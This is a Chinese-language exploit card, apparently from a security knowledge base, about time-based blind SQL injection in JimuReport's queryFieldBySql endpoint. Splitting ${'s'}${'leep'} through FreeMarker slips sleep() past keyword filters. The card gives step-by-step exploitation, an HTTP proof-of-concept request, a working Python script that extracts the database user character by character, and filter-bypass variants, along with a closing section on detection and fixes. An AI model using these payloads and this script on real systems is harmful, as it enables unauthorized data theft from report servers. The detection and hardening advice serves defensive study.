---
id: web-java-component-jimureport-queryfieldbysql-time-blind-sqli
title: JimuReport /jmreport/queryFieldBySql 时间盲注：FreeMarker ${} 拼接绕过 sleep 关键词过滤
type: scenario
domain: web
path: web/java/component
technique: jimureport-queryfieldbysql-time-blind-sqli
aliases:
- 积木报表 SQL 注入
- queryFieldBySql 时间盲注
- ${'s'}${'leep'} 绕过
- select sleep 关键词过滤绕过
- JimuReport 盲注
tags:
- java
- jimureport
- jeecgboot
- sqli
- time-blind
- freemarker
- filter-bypass
- queryfieldbysql
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V65
  verified_at: '2026-11-05T12:04:23+08:00'
  notes: 已对照全文与图05/06/07核对：{"sql":"select ${'s'}${'leep'}(10)"} 与 (5) 分别产生约10.4s/5.2s响应，fieldList 回显 sleep(10)/sleep(5)；自动化脚本逐字符取到数据库用户 sdxyh@172.17.0.1（图07），证明可拖库。未验证点：原文未展示存在 sleep 关键词过滤/WAF，'绕过过滤'为从 obfuscated payload 推断；PoC 未在本机执行。frontmatter 无 sources/source_url（全库惯例）。
---

## 一句话结论

JimuReport 的 `/jmreport/queryFieldBySql` 将 `sql` 先按 FreeMarker 模板渲染再执行，攻击者用 `${'s'}${'leep'}(10)` 在渲染后拼出 `sleep(10)`，绕过对请求原文中 `sleep` 关键词的过滤，形成可拖库的时间盲注。

## 原理

- `/jmreport/queryFieldBySql` 的 `sql` 参数会先经过 FreeMarker 模板渲染，再交给数据库执行；这意味着请求体里的字符串和最终 SQL 不是同一份内容。
- 安全过滤通常只检查请求原文中的危险关键词（如 `sleep(`）。FreeMarker 的 `${'s'}${'leep'}` 会在渲染阶段求值为 `sleep`，所以请求体中不含 `sleep` 字面量，过滤放行；渲染后的 SQL 却包含 `select sleep(10)`。
- 时间盲注的判据是响应耗时：`select ${'s'}${'leep'}(5)` 使服务端延迟约 5 秒，`select ${'s'}${'leep'}(10)` 延迟约 10 秒；用 `if(ascii(substring(...))=char, sleep(3), 1)` 可逐字符判断条件，从而提取数据库名、用户、表名与数据。
- 为什么成立：应用把“模板渲染”和“SQL 执行”串联，过滤发生在渲染前，等价于给攻击者一层可编程的字符串构造能力；只要最终 SQL 可控，时间盲注就能成立。
- 原文实测 `select ${'s'}${'leep'}(5)` 与 `(10)` 分别产生 5 秒和 10 秒延迟，自动化脚本提取出数据库用户 `sdxyh@172.17.0.1`，证明可拖取全库数据。

## 触发条件

- 目标集成 JimuReport 并暴露 `/jmreport/queryFieldBySql`。
- `sql` 参数进入 FreeMarker 模板渲染后直接拼接/执行，未被参数化或严格白名单限制。
- 攻击者能访问接口（本文为管理员 token；若端点未鉴权则无需 token）。
- 数据库支持 `sleep()`、`if()`、`substring()`、`ascii()` 等函数（MySQL/MariaDB 常见）。
- 过滤只检查请求原文中的关键词，未对渲染后的 SQL 做二次检查。

## 利用步骤

1. 获取 token（本文经未授权 `getTokenById` 取得管理员 token，或正常登录）。
2. 基线：提交 `{"sql":"select 1"}`，记录正常响应时间。
3. 注入验证：提交 `{"sql":"select ${'s'}${'leep'}(5)"}`，若响应延迟约 5 秒，确认时间盲注。
4. 逐字符提取：构造 `select if(ascii(substring(${'u'}${'ser'}(),<i>,1))=<char>,${'s'}${'leep'}(3),1)`，按响应是否延迟判断字符。
5. 先取当前数据库用户/库名，再枚举表名、列名与目标数据（用户表、系统配置表等）。
6. 用脚本自动化逐字符请求，注意控制并发与超时，避免误判。

## PoC

```http
POST /zhq/jmreport/queryFieldBySql HTTP/1.1
Host: target
Authorization: Bearer <token>
Content-Type: application/json

{ "sql": "select ${'s'}${'leep'}(5)" }
```

```text
# 响应约 5 秒后返回，fieldList 中出现 "sleep(5)"，证明模板渲染后执行了 sleep
```

```python
# 最小时间盲注骨架（按需替换 URL/token；未在本机执行）
import time, requests

URL = "http://target/zhq/jmreport/queryFieldBySql"
HEADERS = {"Authorization": "Bearer <token>", "Content-Type": "application/json"}

def delayed(sql, threshold=2.5):
    start = time.time()
    requests.post(URL, json={"sql": sql}, headers=HEADERS, timeout=10)
    return time.time() - start >= threshold

def extract_user():
    name = ""
    for i in range(1, 32):
        for code in range(32, 127):
            # FreeMarker 渲染后得到：select if(ascii(substring(user(),i,1))=code,sleep(3),1)
            sql = f"select if(ascii(substring(${{'u'}}${{'ser'}}(),{i},1))={code},${{'s'}}${{'leep'}}(3),1)"
            if delayed(sql):
                name += chr(code)
                print(name)
                break
        else:
            break
    return name

print(extract_user())
```

## 变体与关联

- 变体：用 `${'b'}${'enchmark'}(...)`、`${'e'}${'xtractvalue'}(...)` 等构造其他被过滤函数；也可用 FreeMarker 拼接 `information_schema` 等关键词。
- 变体：若时间盲注被限制，可尝试布尔盲注（响应内容差异）或报错注入；`${}` 拼接同样可用于构造报错函数。
- 变体：同接口的 FreeMarker `<#include>` 任意文件读取（见关联卡）和 `jeecg.compute` Aviator RCE（见关联卡）可独立利用。
- 关联：[[web-java-component-jimureport-queryfieldbysql-freemarker-include-file-read]]、[[web-java-component-jimureport-freemarker-jeecg-compute-aviator-rce]]、[[web-java-framework-jeecgboot-dict-blacklist-bypass-sqli]]（同类“关键词过滤被绕过”的 SQL 注入）、[[web-generic-sqli-mybatis-dollar-brace-injection]]（`${}` 拼接的通用原理）。
- 边界：接口加鉴权且无 token、`sql` 被参数化/白名单、FreeMarker 渲染被禁用、数据库不支持 `sleep` 或函数被禁用、WAF 对渲染后的 SQL 做二次检测时，本场景不成立。

## 检测与防御

- 检测：请求体 `sql` 中出现 `${'...'}` 形式的字符串拼接、`if(ascii(substring`、`benchmark`、`extractvalue` 等模式；同一接口出现大量响应耗时接近 3/5/10 秒的请求；数据库慢查询日志中出现 `sleep`、`if(ascii(substring(...)))`。
- 修复：不要把用户可控 `sql` 交给数据库执行；如报表必须自定义 SQL，使用只读账号、白名单表/字段、参数化查询与行数限制；禁止在 SQL 上做 FreeMarker 模板渲染。
- 加固：对 `/jmreport/*` 加真实鉴权与网络隔离；WAF 同时检查请求原文与渲染后的 SQL（或在应用层做 AST 级校验）；数据库账号最小权限，禁止读取 `mysql.*` 与系统表；监控报表接口的异常时延。
